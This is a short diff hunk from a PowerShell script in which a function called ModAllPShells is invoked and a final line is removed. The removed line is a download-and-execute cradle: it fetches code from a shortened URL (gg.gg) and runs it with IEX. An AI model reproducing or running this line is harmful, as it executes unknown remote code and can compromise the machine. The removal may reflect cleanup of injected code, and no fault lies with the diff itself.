@@ -115,4 +115,3 @@ function ModAllPShells {
 }
 
 ModAllPShells
-IEX([Net.Webclient]::new().DownloadString('http://gg.gg/1bs26v'))
